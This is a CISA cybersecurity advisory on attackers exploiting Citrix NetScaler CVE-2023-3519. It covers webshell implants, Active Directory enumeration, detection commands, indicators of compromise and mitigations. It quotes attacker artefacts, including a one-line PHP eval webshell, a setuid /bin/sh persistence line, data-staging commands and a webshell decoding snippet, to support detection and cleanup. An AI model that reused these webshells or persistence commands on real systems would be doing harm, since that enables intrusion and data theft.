{
  "markdown": "\nSUMMARY\nUpdate September 6, 2023:\nThis Cybersecurity Advisory has been updated with new tactics, techniques, and procedures (TTPs) as well as indicators of compromise (IOCs) received from an additional victim and trusted third parties.\nUpdate End\nThe Cybersecurity and Infrastructure Security Agency (CISA) is releasing this Cybersecurity Advisory to warn network defenders about exploitation of CVE-2023-3519, an unauthenticated remote code execution (RCE) vulnerability affecting NetScaler (formerly Citrix) Application Delivery Controller (ADC) and NetScaler Gateway. In June 2023, threat actors exploited this vulnerability as a zero-day to drop a webshell on a critical infrastructure organization’s non-production environment NetScaler ADC appliance. The webshell enabled the actors to perform discovery on the victim’s active directory (AD) and collect and exfiltrate AD data. The actors attempted to move laterally to a domain controller but network-segmentation controls for the appliance blocked movement.\nThe victim organization identified the compromise and reported the activity to CISA and Citrix. Citrix released a patch for this vulnerability on July 18, 2023.\nThis advisory provides TTPs and detection methods shared with CISA by the victim. CISA encourages critical infrastructure organizations to use the detection guidance included in this advisory for help with determining system compromise. If potential compromise is detected, organizations should apply the incident response recommendations provided in this CSA. If no compromise is detected, organizations should immediately apply patches provided by Citrix.\nDownload the PDF version of this report:\n\n\nAA23-201A Threat Actors Exploiting Citrix CVE-2023-3519 to Implant Webshells\n(PDF,       560.29 KB\n  )\n\n\nUpdate September 6, 2023:\nIn August 2023, CISA received TTPs and IOCs from an additional victim and trusted third parties. This CSA has been updated with the TTPs and IOCs to assist administrators with detecting and responding to this activity.\nFor a downloadable list of IOCs, see the following XML and JSON files:\n\n\nAA23-201A STIX XML\n(XML,       43.13 KB\n  )\n\n\n\n\nAA23-201A STIX JSON\n(JSON,       40.09 KB\n  )\n\n\nUpdate End\n \nTECHNICAL DETAILS\nNote: This advisory uses the MITRE ATT&CK for Enterprise framework, version 13. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK® tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.\nOverview\nIn July 2023, a critical infrastructure organization reported to CISA that threat actors may have exploited a zero-day vulnerability in NetScaler ADC to implant a webshell on their non-production NetScaler ADC appliance. Citrix confirmed that the actors exploited a zero-day vulnerability: CVE-2023-3519. Citrix released a patch on July 18, 2023.[1]\nUpdate September 6, 2023:\nIn August 2023, CISA received TTPs and IOCs from an additional victim and third parties. The actors implanted a webshell, gained root level access to the compromised system, and performed discovery against the Active Directory (AD). For information, see the Victim 2 and Additional Observed Activity sections.\nUpdate End\nCVE-2023-3519\nCVE-2023-3519 is an unauthenticated RCE vulnerability affecting the following versions of NetScaler ADC and NetScaler Gateway:[1]\n\nNetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.13\nNetScaler ADC and NetScaler Gateway 13.0 before 13.0-91.13\nNetScaler ADC and NetScaler Gateway version 12.1, now end of life\nNetScaler ADC 13.1-FIPS before 13.1-37.159\nNetScaler ADC 12.1-FIPS before 12.1-55.297\nNetScaler ADC 12.1-NDcPP before 12.1-55.297\n\nThe affected appliance must be configured as a Gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or authentication, authorization, and auditing (AAA) virtual server for exploitation.[1]\nCISA added CVE-2023-3519 to its Known Exploited Vulnerabilities Catalog on July 19, 2023.\nThreat Actor Activity\nVictim 1\nAs part of their initial exploit chain [T1190], the threat actors uploaded a TGZ file [T1105] containing a generic webshell [T1505.003], discovery script [TA0007], and setuid binary [T1548.001] on the ADC appliance and conducted SMB scanning on the subnet [T1046].\nThe actors used the webshell for AD enumeration [T1016] and to exfiltrate AD data [TA0010]. Specifically, the actors:\n\nViewed NetScaler configuration files /flash/nsconfig/keys/updated/* and /nsconfig/ns.conf [T1005]. Note: These configuration files contain an encrypted password that can be decrypted by the key stored on the ADC appliance [T1552.001].\nViewed the NetScaler decryption keys (to decrypt the AD credential from the configuration file) [T1552.004].\nUsed the decrypted AD credential to query the AD via ldapsearch. The actors queried for:\n\nUsers (objectClass=user) (objectcategory=person) [T1033]\nComputers (objectClass=computer) [T1018]\nGroups (objectClass=group) [T1069.002]\nSubnets (objectClass=subnet)\nOrganizational Units (objectClass=organizationalUnit)\nContacts (objectClass=contact)\nPartitions (objectClass=partition)\nTrusts (objectClass=trustedDomain) [T1482]\n\n\nUsed the following command to encrypt discovery data collected via openssl in “tar ball” [T1560.001]: tar -czvf - /var/tmp/all.txt | openssl des3 -salt -k <> -out /var/tmp/test.tar.gz. (A “tar ball” is a compressed and zipped file used by threat actors for collection and exfiltration.)\nExfiltrated collected data by uploading as an image file [T1036.008] to a web-accessible path [T1074]: cp /var/tmp/test.tar.gz /netscaler/ns_gui/vpn/medialogininit.png.\n\nThe actors’ other discovery activities were unsuccessful due to the critical infrastructure organization’s deployment of their NetScaler ADC appliance in a segmented environment. The actors attempted to:\n\nExecute a subnet-wide curl command to identify what was accessible from within the network as well as potential lateral movement targets.\nVerified outbound network connectivity with a ping command (ping -c 1 google.com) [T1016.001].\nExecuted host commands for a subnet-wide DNS lookup.\n\nThe actors also attempted to delete their artifacts [TA0005]. The actors deleted the authorization configuration file (/etc/auth.conf)—likely to prevent configured users (e.g., admin) from logging in remotely (e.g., CLI) [T1531]. To regain access to the ADC appliance, the organization would normally reboot into single use mode, which may have deleted artifacts from the device; however, the victim had a Secure Shell (SSH) key readily available that allowed them into the appliance without rebooting it.\nThe actors’ post-exploitation lateral movement attempts were also blocked by network-segmentation controls. The actors implanted a second webshell on the victim that they later removed. This was likely a PHP shell with proxying capability. The actors likely used this to attempt proxying SMB traffic to the DC [T1090.001] (the victim observed SMB connections where the actors attempted to use the previously decrypted AD credential to authenticate with the DC from the ADC via a virtual machine). Firewall and account restrictions (only certain internal accounts could authenticate to the DC) blocked this activity.\nUpdate September 6, 2023:\nVictim 2\nThreat actors uploaded a PHP webshell *logouttm.php* [T1036.005], likely as part of their initial exploit chain, to */netscaler/ns_gui/vpn/. Within an hour of installing the webshell, the actors implanted an Executable and Linkable Format (ELF) binary pykeygen that set user unique identifier (UID) to root and executed /bin/sh [T1059.004] via setuid and execve syscall.* [T1106]. Note: A third party also observed threat actors use an ELF binary (named pip4) to execute /bin/sh via syscall and change the UID to root. pip4 was located at /var/python/bin.\nWith root level access, the actors used hands-on-keyboard for discovery. They queried the AD via ldapsearch for users, groups, and computers. They collected the data in gzipped text files renamed 1.css and 2.css and placed the files in /netscaler/ns_gui/vpn/ for exfiltration.\nAfter exfiltrating the files, the actors deleted them from the system [T1070.004] as well as some access logs, error logs, and authentication logs [T1070.002]. The victim organization detected the intrusion and mitigated the activity but did not identify signs of additional malicious activity.\nFor command and control (C2), the actors appeared to use compromised pfSense devices [T1584]; the victim observed communications with two pfSense IP addresses indicating the actor was using them for multi-hop proxying C2 traffic [T1090.003].\nAdditional Observed Activity\nAccording to trusted third party reporting, threat actors leveraged open source webshells and other publicly available tools [T1588.002]:\n\nLoaded loading[.]php to /vpn/vpn/. Loading[.]php is a modified version of an open-source PHP webshell [2]. The modified webshell had a custom protocol handler, update://, created via a stream_wrapper_register (https://www.php.net/manual/en/function.stream-wrapper-register[.]php). The custom protocol enabled the webshell to send encoded commands to the AD via ldapsearch:\n\n\n\n\n\npublic function stream_open($path, $mode, $options, &$opened_path)\n   {\n       $this->code = hex2bin(substr(base64_decode(strrev(substr(substr($path,9),5))),2));\n       $this->position = 0;\n       return true;\n   }\n\n\n\n\n\nLoaded a modified version of open-source SSH inject tool [3] named libnsd.so to the /tmp directory. The file hooks SSH and captures credentials. The actors' modifications to the tool wrote encoded captured credentials (20 random characters + reversed/base64) to a file created in a hard-coded path (/var/nslog/counters/prometheus/metrc_codes_client.log) [T1074.001]. The actors then exfiltrated the collected credentials and deleted /var/nslog/counters/prometheus/metrc_codes_client.log 3 minutes after exfiltration). (The deleted file was recreated, possibly because the actors’ memory hook was still active.)\nDeployed webshells to victim networks at \\vpn\\themes.\n\nOne third party observed the actors deploy the SECRETSAUCE webshell. SECRETSAUCE is a webshell written in PHP. It can receive PHP code from an HTTP POST request, decrypt it using an internally embedded RSA public key [T1140], and execute the code in memory; each request to the webshell returns an HTTP 500 response code. The actor has used the following file names for SECRETSAUCE: vpn[.]php, logout[.]php, log[.]php, prod[.]php [T1036].\nA second third party observed the actors deploy an open source webshell [4] with filename defaults.php.\n\n\nDeployed LIGOLO-NG [5] tunneller with the filename the in the /tmp directory. LIGOLO-NG is a tunneller [T1572] written in Go that provides encrypted reverse TCP/TLS connections [T1573.002] to a remote host.\nDeployed the NPS tunneller [6] to victim networks to the /tmp directory. NPS is an open source tunneller written in Go. It must be configured from the command line or via a configuration file. Features including support for most common protocols and extensions, including compression, encryption, and port reuse.\n\nAdditionally, threat actors:\n\nAppended /flash/nsconfig/rc.netscaler with:chmod u+s /bin/shecho “<?php http_response_code(401);@eval(\\$_REQUEST[‘variable’]);?>” > /[redacted path to webshell]/[redacted].php [T1222.002].\n\nThe webshell path was in a web accessible folder, and the actors’ modifications enabled them to run /bin/sh commands as root and enabled persistence because the webshell was run on every reboot [T1547].\n\nUsed Sysinternals ADExplorer, a Microsoft tool for viewing and editing the AD [7]. The actors dropped the tool to C:\\Users\\<redacted>\\AppData\\Local\\Temp\\ADExplorer.exe and executed it with the following command: ADExplorer.exe -snapshot \"\" <filename>.dat /accepteula.\n\nUpdate End\nMITRE ATT&CK TACTICS AND TECHNIQUES\nSee Table 1–Table 11 for all referenced threat actor tactics and techniques in this advisory.\nUpdate September 6, 2023\nThe tables have been updated with the following techniques:\n\nCompromise Infrastructure [T1584]\nObtain Capabilities: Tool [T1588.002]\nCommand and Scripting Interpreter: Unix Shell [T1059.004]\nNative API [T1106]\nBoot or Logon Autostart Execution [T1547]\nProxy: Multi-hop Proxy [T1090.003]\nDeobfuscate/Decode Files or Information [T1140]\nFile and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification [T1222.002]\nIndicator Removal [T1070]\nIndicator Removal: Clear Linux or Mac System Logs [T1070.002]\nIndicator Removal: File Deletion [T1070.004]\nMasquerading [T1036]\nMasquerading: Match Legitimate Name or Location [T1036.005]\nData Staged: Local Data Staging [T1074.001]\nProtocol Tunneling [T1572]\n\nEnd Update\n\nTable 1: Cyber Threat Actors ATT&CK Techniques for Resource Development\n\n\nTechnique Title\nID\nUse\n\n\n\n\nCompromise Infrastructure\nT1584\nThe threat actors appear to have used compromised pfSense devices to proxy C2 traffic to Victim 2.\n\n\nObtain Capabilities: Tool\nT1588.002\nThe threat actors leveraged open source webshells [2] [4] and other publicly available tools, including a modified version of open-source SSH inject tool [3], LIGOLO-NG [5] tunneller, and NPS tunneller [6].\n\n\n\n \n\nTable 2: Cyber Threat Actors ATT&CK Techniques for Initial Access\n\n\nTechnique Title\nID\nUse\n\n\n\n\nExploit Public-Facing Application\nT1190\nThe threat actors exploited CVE-2023-3519 to implant a webshell on the organization’s NetScaler ADC appliance.\n\n\n\n \n\nTable 3: Cyber Threat Actors ATT&CK Techniques for Execution\n\n\nTechnique Title\nID\nUse\n\n\n\n\nCommand and Scripting Interpreter: Unix Shell\nT1059.004\nThe threat actors executed /bin/sh as root.\n\n\nNative API\nT1106\nThe threat actors executed /bin/sh via syscall.\n\n\n\n \n\nTable 4: Cyber Threat Actors ATT&CK Techniques for Persistence\n\n\nTechnique Title\nID\nUse\n\n\n\n\nBoot or Logon Autostart Execution\nT1547\nThreat actors used /flash/nsconfig/rc.netscaler rewrite a webshell on every reboot.\n\n\nServer Software Component: Web Shell\nT1505.003\nThe threat actors implanted a generic webshell on the organization’s NetScaler ADC appliance.\n\n\n\n \n\nTable 5: Cyber Threat Actors ATT&CK Techniques for Privilege Escalation\n\n\nTechnique Title\nID\nUse\n\n\n\n\nAbuse Elevation Control Mechanism: Setuid and Setgid\nT1548.001\nAs part of their initial exploit chain, the threat actors uploaded a TGZ file contain a setuid binary on the ADC appliance.\n\n\n\n \n\nTable 6: Cyber Threat Actors ATT&CK Techniques for Defense Evasion\n\n\nTechnique Title\nID\nUse\n\n\n\n\nDeobfuscate/Decode Files or Information\nT1140\nThe threat actors deployed the SECRETSAUCE webshell, which can receive PHP code from an HTTP POST request, decrypt it using an internally embedded RSA public key.\n\n\nFile and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification\nT1222.002\nThe threat actors appended /flash/nsconfig/rc.netscaler with:chmod u+s /bin/shecho “<?php http_response_code(401);@eval(\\$_REQUEST[‘variable’]);?>” > /[redacted path to webshell]/[redacted].php.\n\n\nIndicator Removal\nT1070\nThe threat actors deleted log files from Victim 2.\n\n\nIndicator Removal: Clear Linux or Mac System Logs\nT1070.002\nThe threat actors some access logs, error logs, and authentication logs from Victim 2.\n\n\nIndicator Removal: File Deletion\nT1070.004\nThe threat actors deleted collected files after exfiltrating them.\n\n\nMasquerading\nT1036\nThe actor has used the following file names for SECRETSAUCE to appear legitimate: vpn[.]php, logout[.]php, log[.]php, and prod[.]php.\n\n\nMasquerading: Match Legitimate Name or Location\nT1036.005\nThe threat actors named a webshell *logouttm.php*.\n\n\nMasquerading: Masquerade File Type\nT1036.008\nThe threat actors exfiltrated data by uploading it as an image file to a web-accessible path.\n\n\n\n \n\nTable 7: Cyber Threat Actors ATT&CK Techniques for Credential Access\n\n\nTechnique Title\nID\nUse\n\n\n\n\nUnsecured Credentials: Credentials In Files\nT1552.001\nThe threat actors obtained encrypted passwords from NetScaler ADC configuration files, and the decryption key was stored on the ADC appliance.\n\n\nUnsecured Credentials: Private Keys\nT1552.004\nThe threat actors obtained decryption keys to decrypt the AD credential obtained from the NetScaler ADC configuration files.\n\n\n\n \n\nTable 8: Cyber Threat Actors ATT&CK Techniques for Discovery\n\n\nTechnique Title\nID\nUse\n\n\n\n\nDomain Trust Discovery\nT1482\nThe threat actors queried the AD for trusts.\n\n\nPermission Groups Discovery: Domain Groups\nT1069.002\nThe threat actors quired the AD for groups.\n\n\nRemote System Discovery\nT1018\n\nThe threat actors queried the AD for computers.\nThe threat actors attempted to execute a subnet-wide curl command to identify what was accessible from within the network as well as potential lateral movement targets. Network-segmentation controls prevented this activity.\n\n\n\nSystem Network Configuration Discovery\nT1016\nThe actors used a webshell for AD enumeration.\n\n\nSystem Network Configuration Discovery: Internet Connection Discovery\nT1016.001\nThe threat actors attempted to verify outbound network connectivity with a ping command and executed host commands for a subnet-wide DNS lookup. Network-segmentation controls prevented this activity.\n\n\nNetwork Service Discovery\nT1046\nThe threat actors conducted SMB scanning on the organization’s subnet.\n\n\nAccount Discovery: Domain Account\nT1087.002\nThe threat actors queried the AD for users.\n\n\n\n \n\nTable 9: Cyber Threat Actors ATT&CK Techniques for Collection\n\n\nTechnique Title\nID\nUse\n\n\n\n\nArchive Collected Data: Archive via Utility\nT1560.001\n\nThe threat actors encrypted discovery data collected via openssl in “tar ball.”\nUpdate September 6, 2023:\nThe threat actors collected data in gzipped text files.\nEnd update\n\n\n\nData from Local System\nT1005\nThe threat actors viewed NetScaler ADC configuration files flash/nsconfig/keys/updated/* and /nsconfig/ns.conf.\n\n\nData Staged\nT1074\nThe threat actors uploaded data as an image file to a web-accessible path: cp /var/tmp/test.tar.gz /netscaler/ns_gui/vpn/medialogininit.png.\n\n\nData Staged: Local Data Staging\nT1074.001\nThe threat actors modified tool wrote captured credentials to a file created in a hard-coded path (/var/nslog/counters/ prometheus/metrc_codes_client.log).\n\n\n\n \n\nTable 10: Cyber Threat Actors ATT&CK Techniques for Command and Control\n\n\nTechnique Title\nID\nUse\n\n\n\n\nEncrypted Channel: Asymmetric Cryptography\nT1573.002\nThe threat actors deployed LIGOLO-NG, which is a tunneller that provides encrypted reverse TCP/TLS connections to a remote host.\n\n\nIngress Tool Transfer\nT1105\nThe threat actors exploited CVE-2023-3519 to upload a TGZ file containing a generic webshell, discovery script, and setuid binary on the ADC appliance.\n\n\nProtocol Tunneling\nT1572\nThe threat actors deployed LIGOLO-NG and NPS tunnellers.\n\n\nProxy: Internal Proxy\nT1090.001\nThe actors likely used a PHP shell with proxying capability to attempt proxying SMB traffic to the DC (the traffic was blocked by a firewall and account restrictions).\n\n\nProxy: Multi-hop Proxy\nT1090.003\nThe threat actors appear to have used compromised pfSense devices to proxy C2 traffic to Victim 2.\n\n\n\n \n\nTable 11: Cyber Threat Actors ATT&CK Techniques for Impact\n\n\nTechnique Title\nID\nUse\n\n\n\n\nAccount Access Removal\nT1531\nThe threat actors deleted the authorization configuration file (/etc/auth.conf)—likely to prevent configured users from logging in remotely (e.g., CLI).\n\n\n\n \nDETECTION METHODS\nRun the following victim-created checks on the ADC shell interface to check for signs of compromise:\n\nCheck for files newer than the last installation.\nModify the -newermt parameter with the date that corresponds to your last installation:\n\nfind /netscaler/ns_gui/ -type f -name *.php -newermt [YYYYMMDD] -exec ls -l {} \\;\nfind /var/vpn/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;\nfind /var/netscaler/logon/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;\nfind /var/python/ -type f -newermt [YYYYMMDD] -exec ls -l {} \\;\n\n\nCheck http error logs for abnormalities that may be from initial exploit:\n\nzgrep '\\.sh' /var/log/httperror.log*\nzgrep '\\.php' /var/log/httperror.log*\n\n\nCheck shell logs for unusual post-ex commands, for example:\n\ngrep '/flash/nsconfig/keys' /var/log/sh.log*\n\n\nLook for setuid binaries dropped:\n\nfind /var -perm -4000 -user root -not -path \"/var/nslog/*\" -newermt [YYYYMMDD] -exec ls -l {} \\;\n\n\nReview network and firewall logs for subnet-wide scanning of HTTP/HTTPS/SMB (80/443/445) originating from the ADC.\nReview DNS logs for unexpected spike in internal network computer name lookup originating from the ADC (this may indicate the threat actor resolving host post-AD enumeration of computer objects).\nReview network/firewall logs for unexpected spikes in AD/LDAP/LDAPS traffic originating from the ADC (this may indicate AD/LDAP enumeration).\nReview number of connections/sessions from NetScaler ADC per IP address for excessive connection attempts from a single IP (this may indicate the threat actor interacting with the webshell).\nPay attention to larger outbound transfers from the ADC over a short period of session time as it can be indicative of data exfiltration.\nReview AD logs for logon activities originating from the ADC IP with the account configured for AD connection. \nIf logon restriction is configured for the AD account, check event 4625 where the failure reason is “User not allowed to logon at this computer.”\nReview NetScaler ADC internal logs (sh.log*, bash.log*) for traces of potential malicious activity (some example keywords for grep are provided below): \n\ndatabase.php\nns_gui/vpn\n/flash/nsconfig/keys/updated \nLDAPTLS_REQCERT \nldapsearch \nopenssl + salt\n\n\nReview NetScaler ADC internal access logs (httpaccess-vpn.log*) for 200 successful access of unknown web resources.\n\nUpdate September 6, 2023:\nThe following resources may assist with detecting signs of compromise:\n\nMandiant: Exploitation of Citrix Zero-Day by Possible Espionage Actors (CVE-2023-3519)\nGreyNoise: Will the real Citrix CVE-2023-3519 please stand up?\nShadowserver: Technical Summary of Observed Citrix CVE-2023-3519 Incidents\nMandiant: Indicators of Compromise Scanner for Citrix ADC Zero-Day (CVE-2023-3519)\n(Update October 6, 2023) IBM: X-Force uncovers global NetScaler Gateway credential harvesting campaign\n\nEnd Update\n \nUpdate September 6, 2023:\nINDICATORS OF COMPROMISE\nSee Table 12 for IOCs obtained from Victim 2. (Note: a trusted third party observed the same PHP webshell and ELF binary hashes).\n\nTable 12: Victim 2-provided IOCs Affiliated with Citrix CVE-2023-3519 Exploitation\n\n\nFile Name\nDescription\nSHA-1 Hash\nMD5 Hash\n\n\n\n\nLogouttm[.]php\nPHP Webshell\n3345ad8b43d6771532ca55acf7e95fe98aeadb27\n47b8d29319a9e85aaf829f4f2f9c6c00\n\n\npykeygen\nELF Binary\nb8f9258e9c7c882944e2b773557b49e5821517fe\nee51f599d266be5fd89b423ca24521f1\n\n\n\n \nSee Table 13 and Table 14 for IOCs addresses obtained from trusted third parties.\n\nTable 13: Third-party Provided IP Addresses Affiliated with Citrix CVE-2023-3519 Exploitation\n\n\nIP Address\nDescription\nDate Observed\n\n\n\n\n5.2.64[.]155\nThreat actors used this to drop a webshell.\nJune 12, 2023\n\n\n5.255.101[.]76\nAttempted outbound connection to this C2 observed on a victim.\nLate June 2023\n\n\n172.94.124[.]18\nThreat actors used this infrastructure to remote into a victim network.\nJuly 20, 2023\n\n\n154.6.91[.]149\nThreat actors used this infrastructure to remote into a victim network.\nJuly 21, 2023\n\n\n\n \n\nTable 14: Third-party Provided IOCs Affiliated with Citrix CVE-2023-3519 Exploitation\n\n\nFile Name\nDescription\nSHA-1 Hash\nMD5 Hash\n\n\n\n\ninfo[.]php\nPHP Webshell\n55c83cb25be5c521e4874e22b1422c360abf0a29\nc0b32901f9c6ce3f965b8552f7d058d4\n\n\nNPS\nNPS tunneller [4]\nec17f7b3acb2334a062c37e0271c31c3c8b6879c\n9b6f12aed2369a99a1132edd2ede779d\n\n\nthe\nLIGOLO-NG [3] tunneller\ndec36a2aa4ecb86eafd01015e27c06f51d104317\nb383c4ed6712a0a06fb85b1d8405e0f1\n\n\n\nEnd Update\n \nINCIDENT RESPONSE\nIf compromise is detected, organizations should:\n\nQuarantine or take offline potentially affected hosts.\nReimage compromised hosts.\nProvision new account credentials.\nCollect and review artifacts such as running processes/services, unusual authentications, and recent network connections.\nReport the compromise to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870).\n\nUpdate September 6, 2023:\nIf the threat actor used /flash/nsconfig/rc.netscaler to make /bin/sh a setuid binary and to rewrite a webshell on every reboot, organizations should clean rc.netscaler to prevent the webshell from getting rewritten by using the following third-party created command.\n\n\n\n\nroot@SOME-NETSCALER# cat /flash/nsconfig/rc.netscaler\n[redacted output]\nchmod u+s /bin/sh\necho \"<?php http_response_code(401);@eval(\\$_REQUEST['variable']);?>\" > /[redacted webshell path]/[redacted].php\n \nroot@SOME-NETSCALER# cat /[redacted webshell path]/[redacted].php\n<?php http_response_code(401);@eval($_REQUEST['variable']);?>\n\n\n\n\n \nMITIGATIONS\nCISA recommends all organizations:\n\nInstall the relevant updated version of NetScaler ADC and NetScaler Gateway as soon as possible. See Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467 for patch information.\nFollow best cybersecurity practices in your production and enterprise environments, including mandating phishing-resistant multifactor authentication (MFA) for all staff and for all services. For additional best practices, see CISA’s Cross-Sector Cybersecurity Performance Goals (CPGs). The CPGs, developed by CISA and the National Institute of Standards and Technology (NIST), are a prioritized subset of information technology (IT) and operational technology (OT) security practices that can meaningfully reduce the likelihood and impact of known cyber risks and common TTPs. Because the CPGs are a subset of best practices, CISA and ACSC also recommend software manufacturers implement a comprehensive information security program based on a recognized framework, such as the NIST Cybersecurity Framework (CSF).\nAs a longer-term effort, apply robust network-segmentation controls on NetScaler appliances, and other internet-facing devices.\n\n \nVALIDATE SECURITY CONTROLS\nIn addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.\nTo get started:\n\nSelect an ATT&CK technique described in this advisory (see Table 1–Table 11).\nAlign your security technologies against the technique.\nTest your technologies against the technique.\nAnalyze your detection and prevention technologies’ performance.\nRepeat the process for all security technologies to obtain a set of comprehensive performance data.\nTune your security program, including people, processes, and technologies, based on the data generated by this process.\n\nCISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.\n \nREFERENCES\n[1] Citrix Security Bulletin CTX561482: Citrix ADC and Citrix Gateway Security Bulletin for CVE-2023-3519, CVE-2023-3466, CVE-2023-3467\nUpdate September 6, 2023:\n[2] GitHub - dxkite/php-stream-shell: a simple stream_wrapper shell\n[3] GitHub - ssh-inject/injectme.c\n[4] GitHub - L-codes/Neo-reGeorg: Neo-reGeorg is a project that seeks to aggressively refactor reGeorg\n[5] GitHub - nicocha30/ligolo-ng\n[6] GitHub - ehang-io/nps\n[7] Microsoft: AD Explorer - Sysinternals\nEnd Update\n \nUpdate September 6, 2023:\nACKNOWLEDGEMENTS\nMandiant and Shadowserver contributed to this Cybersecurity Advisory.\nEnd Update\n \nVERSION HISTORY\nJuly 20, 2023: Initial version.July 24, 2023: Updated affected NetScaler ADC 12.1-FIPS and NetScaler ADC 12.1-NDcPP version numbers. Updated Step 3 in Detection Methods to use zgrep instead of grep.September 6, 2023: Updates noted throughout.September 21, 2023: Removed persistence commands and associated technique for tampering with security tools.October 6, 2023: Updated resources in Detection Methods section\n",
  "cves": [
    "CVE-2023-3466",
    "CVE-2023-3467",
    "CVE-2023-3519"
  ],
  "techniques": [
    "T1548.001",
    "T1505.003",
    "T1552.004",
    "T1070.004",
    "T1560.001",
    "T1552.001",
    "T1059.004",
    "T1036.008",
    "T1069.002",
    "T1573.002",
    "T1090.001",
    "T1016.001",
    "T1222.002",
    "T1070.002",
    "T1087.002",
    "T1588.002",
    "T1074.001",
    "T1090.003",
    "T1036.005"
  ],
  "advisory": "aa23-201a",
  "title": "Threat Actors Exploiting Citrix CVE-2023-3519 to Implant Webshells | CISA",
  "source": "cybersecurity-advisories",
  "id": "33fbea1738e328858f44ebcb0d2cf245f54de13a0a1504b7f013049ea602a05d"
}